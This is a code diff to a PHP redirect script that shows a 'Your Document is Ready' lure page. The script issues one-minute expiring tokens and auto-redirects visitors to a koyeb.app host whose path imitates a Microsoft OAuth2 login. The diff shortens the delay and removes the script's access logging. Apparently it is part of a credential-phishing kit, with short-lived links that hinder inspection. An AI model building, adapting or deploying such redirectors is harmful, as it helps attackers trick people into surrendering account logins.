@@ -1,6 +1,6 @@
 <?php
 // ==============================================
-// SECURE 1-MINUTE REDIRECT LINK HANDLER
+// SECURE 5-SECOND REDIRECT LINK HANDLER
 // ==============================================
 
 // Enable error reporting for debugging (disable in production)
@@ -16,8 +16,7 @@ if (getenv('APP_ENV') !== 'production') {
 $config = [
     'redirect_url' => 'https://representative-joelynn-activedirectory-39a69909.koyeb.app/oauth2/common/client_id_b61c8803-16f3-4c35-9b17-6f65f441df86/', // <--- Change to your target URL
     'expire_seconds' => 60,  // Token expiry time in seconds
-    'log_file' => 'pdf_access.log',
-    'redirect_delay' => 1
+    'redirect_delay' => 5  // Changed delay to 5 seconds
 ];
 
 // Block CLI access
@@ -46,16 +45,6 @@ try {
             throw new Exception("This link has expired after 1 minute");
         }
 
-        // Log successful access
-        file_put_contents($config['log_file'], sprintf(
-            "%s|REDIRECTED|%s|%s|%s|%s\n",
-            date('Y-m-d H:i:s'),
-            $_SERVER['REMOTE_ADDR'],
-            $token,
-            $_SERVER['HTTP_REFERER'] ?? 'direct',
-            $_SERVER['HTTP_USER_AGENT']
-        ), FILE_APPEND);
-
         // Redirect to the target URL
         header("Location: " . $config['redirect_url']);
         exit;
@@ -65,15 +54,6 @@ try {
     $token = generateToken();
     $current_url = (isset($_SERVER['HTTPS']) ? 'https://' : 'http://') . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'];
     $tempUrl = $current_url . '?token=' . urlencode($token);
-
-    // Log token generation
-    file_put_contents($config['log_file'], sprintf(
-        "%s|GENERATED|%s|%s|%s\n",
-        date('Y-m-d H:i:s'),
-        $_SERVER['REMOTE_ADDR'],
-        $token,
-        $_SERVER['HTTP_USER_AGENT']
-    ), FILE_APPEND);
 
 } catch (Exception $e) {
     error_log("Redirect Error: " . $e->getMessage());
@@ -144,7 +124,7 @@ try {
         <h1>Your Document is Ready</h1>
         
         <div class="countdown">
-            Auto-redirecting in <span id="countdown"><?= $config['redirect_delay'] ?></span> second...
+            Auto-redirecting in <span id="countdown"><?= $config['redirect_delay'] ?></span> seconds...
         </div>
         
         <div class="url-box">
